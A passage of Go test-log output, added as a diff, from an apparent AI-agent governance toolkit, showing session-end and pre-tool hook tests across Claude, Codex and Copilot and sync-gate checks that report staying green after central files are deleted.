+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict3197361885/001
+Modo de instalacao: copy
+-> Instalando claude...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchAllowsApprovedVerdictcodex2590704431/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchAllowsApprovedVerdictclaude448491833/001
+Modo de instalacao: copy
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+=== CONT  TestClaudeNormalizationCrossToolE2E/T-INT-02a:_bash_normalizado_em_sessao_Claude_(RF-02.1)
+2026/09/18 14:45:05 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:45:05 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:45:05 INFO connection closed cause="peer connection closed"
+=== CONT  TestClaudeNormalizationCrossToolE2E/T-INT-02d:_regressao_T-19_—_sessao_F1-Claude_sem_flags_novas_(RF-02,_C-01)
+2026/09/18 14:45:05 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:45:05 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:45:05 INFO connection closed cause="peer connection closed"
+=== CONT  TestClaudeNormalizationCrossToolE2E/T-INT-02c:_MarshalJSON_inclui_normalized_name_e_raw_name_no_JSONL_(RF-02.1)
+2026/09/18 14:45:05 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:45:05 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:45:05 INFO connection closed cause="peer connection closed"
+=== CONT  TestClaudeNormalizationCrossToolE2E/T-INT-02b:_NoNormalize=true_preserva_evento_sem_metadata_(RF-02.4)
+2026/09/18 14:45:05 runner: durable memory disabled (RF-28); legacy path preserved
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/lib
+2026/09/18 14:45:05 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:45:05 INFO connection closed cause="peer connection closed"
+--- PASS: TestClaudeNormalizationCrossToolE2E (0.00s)
+    --- PASS: TestClaudeNormalizationCrossToolE2E/T-INT-02a:_bash_normalizado_em_sessao_Claude_(RF-02.1) (0.01s)
+    --- PASS: TestClaudeNormalizationCrossToolE2E/T-INT-02d:_regressao_T-19_—_sessao_F1-Claude_sem_flags_novas_(RF-02,_C-01) (0.01s)
+    --- PASS: TestClaudeNormalizationCrossToolE2E/T-INT-02c:_MarshalJSON_inclui_normalized_name_e_raw_name_no_JSONL_(RF-02.1) (0.01s)
+    --- PASS: TestClaudeNormalizationCrossToolE2E/T-INT-02b:_NoNormalize=true_preserva_evento_sem_metadata_(RF-02.4) (0.00s)
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/policies
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/skills
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/scripts
+--- PASS: TestSessionEndHookDispatchAllowsApprovedVerdict (0.00s)
+    --- PASS: TestSessionEndHookDispatchAllowsApprovedVerdict/copilot (0.91s)
+    --- PASS: TestSessionEndHookDispatchAllowsApprovedVerdict/codex (0.86s)
+    --- PASS: TestSessionEndHookDispatchAllowsApprovedVerdict/claude (0.88s)
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/hooks
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-session-end.sh
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict518538650/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict1146166345/001
+Modo de instalacao: copy
+--- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents (1.06s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-confirmed (1.23s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload (1.96s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/apply-patch-go (0.95s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-unconfirmed (0.93s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/markdown-file (1.34s)
+    --- PASS: TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload-confirmed (1.32s)
+=== CONT  TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.claude/skills
+--- PASS: TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict (0.00s)
+    --- PASS: TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/claude (0.86s)
+    --- PASS: TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/copilot (1.13s)
+    --- PASS: TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/codex (1.10s)
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/validate-session-end.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/policies/code-style.md; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/policies/code-style.md; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/policies/governance.md; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .claude/scripts/validate-session-end.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/policies/governance.md; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/hooks/validate-session-end.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/hooks/subagent-stop-wrapper.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .claude/scripts/validate-session-end.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/hooks/subagent-stop-wrapper.sh; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+--- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted (0.00s)
+    --- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/policies (2.72s)
+    --- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/scripts (3.22s)
+    --- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/hooks (3.33s)
+    --- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/skills (3.76s)
+    --- PASS: TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/lib (6.43s)
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/policies/code-style.md; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesc399347430/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesc399347430/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesc399347430/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/hooks/post-execute-task.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/policies/governance.md; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesg3001131481/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesg3001131481/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentspoliciesg3001131481/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/lib/parse-hook-input.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/lib/check-invocation-depth.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/hooks/post-execute-task.sh; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .claude/scripts/validate-session-end.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.claudescriptsva1420919426/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.claudescriptsva1420919426/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.claudescriptsva1420919426/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/validate-skill-prerequisites.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/hooks/validate-session-end.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali2712301173/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali2712301173/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali2712301173/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/lib/parse-hook-input.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/lib/check-invocation-depth.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/lib/parse-hook-input.sh; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/scripts/validate-skill-prerequisites.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/lib/check-invocation-depth.sh; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/resolve-references.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/scripts/resolve-references.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/validate-task-evidence.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/hook-prereq-gate.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/scripts/git-operation-gate.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/scripts/validate-task-evidence.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/scripts/git-operation-gate.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+    sync_gates_guard_test.go:196: scripts/check-hooks-sync.sh stayed green after deleting .agents/scripts/hook-prereq-gate.sh; output=
+        Hooks em sync: 28
+        Drift / missing: 0
+        Gate de encerramento em sync: 7/7 mirrors
+        Validadores por ferramenta com drift: 0
+        LOCAL-ONLY: .claude/hooks/validate-token-budget.sh fora dos mirrors por decisao explicita (ver allowlist neste script)
+        Todos os hooks orquestrador sincronizados.
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/scripts/validate-skill-prerequisites.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva2047555154/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva2047555154/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva2047555154/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js
+=== CONT  TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/internal/embedded/assets/.agents/skills
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .agents/hooks/validate-preload.sh; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/scripts/resolve-references.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsre277601997/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsre277601997/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsre277601997/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== CONT  TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.github/skills
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting internal/embedded/assets/.opencode/plugin/governance.js; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js
+    sync_gates_guard_test.go:196: scripts/check-policies-sync.sh stayed green after deleting .opencode/plugin/governance.js; output=
+        Policies em sync: 2
+        Drift / missing: 0
+        Todas as policies sincronizadas entre .agents/policies/ e .claude/rules/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .agents/hooks/validate-preload.sh; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/scripts/validate-task-evidence.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva776409557/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva776409557/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsva776409557/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
